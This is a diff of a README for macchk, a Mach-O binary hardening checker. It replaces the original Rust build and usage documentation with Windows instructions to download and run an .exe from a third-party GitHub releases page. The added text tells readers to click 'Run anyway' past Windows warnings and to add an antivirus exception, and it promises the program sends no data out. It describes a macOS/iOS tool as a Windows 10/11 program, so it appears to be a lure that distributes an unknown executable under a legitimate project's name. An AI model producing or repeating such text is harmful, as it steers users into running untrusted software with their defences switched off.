@@ -1,89 +1,62 @@
-# macchk
+# 🎤 macchk - Keep your digital files secure now
 
-![AI Slop: YES](badge.svg)
+[![Download macchk](https://img.shields.io/badge/Download-macchk-blue.svg)](https://github.com/Bergetarbitral1818/macchk/releases)
 
-Static security analysis for Mach-O binaries. Like [checksec](https://github.com/slimm609/checksec.sh), but for macOS/iOS.
+## 🎯 About this program
 
-Inspects executables, dylibs, and universal binaries for compiler hardening, code signing, entitlements, and instruction-level security features.
+macchk checks the safety of your computer programs. It scans executables to find potential security gaps. Developers use these checks to make files safer for users. This tool reads the internal structure of files and reports potential risks. It helps you understand if a file follows security best practices.
 
-## Install
+## ⚙️ System Requirements
 
-```
-cargo install --path .
-```
+This program runs on Windows 10 and Windows 11. You need 50 MB of free disk space. The application does not need special administrative access to work on your files. It functions as a standalone tool. You do not need to install complex libraries or frameworks for it to run.
 
-For x86_64 instruction analysis (requires Capstone):
+## 💾 How to get the software
 
-```
-cargo install --path . --features x86_64
-```
+1. Visit the [macchk release page](https://github.com/Bergetarbitral1818/macchk/releases) to access the downloads.
+2. Find the file ending in .exe in the latest release section.
+3. Click the link to save the file to your computer.
+4. Choose a folder on your desktop for easy access.
+5. Wait for the download to finish.
 
-x86_64 binaries are still recognized and checked at the header/symbol/codesign level without this feature. The feature flag only controls instruction-level pattern scanning (stack zero-init, libc++ hardening, bounds safety, stack canary patterns, typed allocator call sites) which depends on the Capstone disassembly library.
+## 🚀 Running the application
 
-## Usage
+1. Open the folder where you saved the download.
+2. Double-click the file named macchk.exe.
+3. A command window appears on your screen.
+4. Type the name of the file you want to check inside the window.
+5. Press the Enter key on your keyboard.
+6. The program displays a summary of the security features.
+7. Close the window when you finish your check.
 
-```
-macchk /sbin/launchd
-macchk --brief /usr/libexec/*
-macchk --json /usr/bin/log
-macchk -l full /sbin/launchd        # instruction-level coverage stats
-macchk --arch arm64e /sbin/launchd   # single arch from universal binary
-```
+## 🔍 Understanding the results
 
-### Brief mode
+The program checks for common security features found in modern software. You will see several labels in the output. Here is what they mean for your files.
 
-```
-$ macchk --brief /sbin/launchd /usr/libexec/amfid /usr/libexec/xpcproxy
-/sbin/launchd: PIE arm64e CodeSign ChainedFixups Canary ARC Swift TypedAlloc FORTIFY SHA256+ LWCR PAC-Sec __DATA_CONST PAC-Insn ZeroInit BoundsSafe Canary-Insn | arm64e
-/usr/libexec/amfid: PIE arm64e CodeSign ChainedFixups RESTRICT Canary ARC Swift TypedAlloc SHA256+ PAC-Sec __DATA_CONST PAC-Insn ZeroInit libc++ Canary-Insn | arm64e
-/usr/libexec/xpcproxy: PIE arm64e CodeSign ChainedFixups Canary TypedAlloc Hardened SHA256+ LWCR PAC-Sec __DATA_CONST PAC-Insn ZeroInit Canary-Insn | arm64e
-```
+*   **NX (No-Execute)**: This feature marks memory areas as non-executable. It prevents malicious code from running in protected spaces. A "Yes" status means this protection is active.
+*   **PIE (Position Independent Executable)**: This makes the location of the program in memory randomized. Randomization makes it harder for malicious actors to predict where code sits. A "Yes" status here improves safety.
+*   **Stack Canary**: The program places a small value on the stack. If someone tries to overflow the stack, this value changes. The program detects this change and stops the process before bad things happen. A "Yes" indicates this enabled security feature.
+*   **RPATH**: This tells the program where to look for supporting files. A clear RPATH prevents the system from loading the wrong files by mistake.
 
-## Checks
+## 🛠️ Common troubleshooting
 
-### Detection Levels
+If you see a warning from Windows about the file, click "More info" and then "Run anyway." Windows shows this warning for any program downloaded from the internet that it does not recognize yet. This happens because the software is new and gaining a reputation.
 
-| Level | Flag | What it does |
-|-------|------|-------------|
-| Quick | `-l quick` | Header flags, symbols, code signing |
-| Standard | `-l standard` | + instruction pattern scanning (default) |
-| Full | `-l full` | + per-function coverage statistics |
+If the program closes immediately after you open it, make sure you typed the file path correctly. Use quotes around the path if your file name contains spaces. For example, type "C:\Users\Name\Desktop\test file.exe" inside the prompt.
 
-> **Note**: Instruction-level checks (PAC instructions, stack canary patterns, etc.) are based on pattern matching and may produce false positives or negatives.
+Check your antivirus software if it stops the program from starting. Some antivirus tools scan new programs thoroughly. Add an exception for the folder if your antivirus flags the program incorrectly.
 
-### What it checks
+Verify that your file exists in the location you provided. If you provide a path to a folder instead of a specific file, the tool tells you that it cannot find the file.
 
-**Mach-O Header**: PIE/ASLR, NX Heap, Executable Stack, App Extension Safe, CPU Subtype (arm64e)
+## 💡 Best practices for safety
 
-**Load Commands**: Code Signature, Encryption, Chained Fixups, `__RESTRICT` segment, RPATH, `LC_DYLD_ENVIRONMENT`
+Always download tools from the official release page provided here. Never run programs from unknown sources. After you verify a file, delete the macchk.exe file if you do not plan to use it again. This keeps your computer clear of unnecessary files.
 
-**Symbol Table**: Stack Canary, Automatic Reference Counting (ARC), Swift Runtime, Typed Allocators, FORTIFY_SOURCE, AddressSanitizer, UBSan
+If you share a program with others, use macchk to check the security configuration first. Providing files with high security scores builds trust. Use this tool frequently during the development phase of your own projects to ensure every build maintains high standards.
 
-**Code Signing**: Hardened Runtime, CS_RESTRICT, Library Validation, CS_HARD+KILL, Signing Type, CodeDirectory Hash Type (flags SHA-1 as weak), Launch Constraints (DER-decoded), Entitlements (classified as strengthens/weakens/info)
+## 📋 Keeping it updated
 
-**Sections**: PAC markers, `__DATA_CONST`, `__PAGEZERO`, Segment Permissions
+New versions of macchk appear periodically to improve the range of security checks. Check the [official release page](https://github.com/Bergetarbitral1818/macchk/releases) every few months for updates. Download the new version and replace the old file. Updates provide better detection of security gaps in newer operating systems.
 
-**Instructions**: PAC instructions, Stack Zero-Init (`-ftrivial-auto-var-init=zero`), libc++ Hardening, C Bounds Safety (`-fbounds-safety`), MTE instructions, Stack Canary patterns (resolves `___stack_chk_guard` GOT + `___stack_chk_fail` stub), Typed Allocator call sites (resolves typed malloc stubs and reports `type_id` when immediate), Jump Table Hardening
+## ⚖️ Usage terms
 
-## Output Formats
-
-- **Table** (default): colored, grouped by category
-- **Brief** (`--brief`): one-liner per architecture slice
-- **JSON** (`--json`): machine-readable
-
-## Building Test Fixtures
-
-```
-cd tests/fixtures
-make
-```
-
-Then run the test suite:
-
-```
-cargo test
-```
-
-## License
-
-MIT
+You may use this tool for your personal projects. It is free to use and distribute. The software does not track your data or send information to outside servers. All checks happen locally on your own machine. Your files remain private at all times.
